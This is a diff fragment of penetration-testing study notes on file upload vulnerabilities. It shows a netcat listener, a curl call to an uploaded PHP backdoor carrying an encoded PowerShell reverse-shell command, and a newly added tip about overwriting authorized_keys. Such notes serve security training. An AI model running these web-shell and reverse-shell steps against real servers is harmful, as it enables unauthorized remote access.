@@ -185,6 +185,8 @@ kali@kali:~$ nc -nvlp 4444
 kali@kali:~$ curl http://example.com/subdir/uploads/simple-backdoor.pHP?cmd=powershell%20-enc%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAG...
 ```
 
+- See if you can overwrite files, such as authorized_keys. Worst case, you may get information about the web stack
+
 19. File Upload Vulns (Non-Executable)
 
 - When testing a file upload form, we should always determine what happens when a file is uploaded twice. If the web application indicates that the file already exists, we can use this method to brute force the contents of a web server. Alternatively, if the web application displays an error message, this may provide valuable information such as the programming language or web technologies in use.
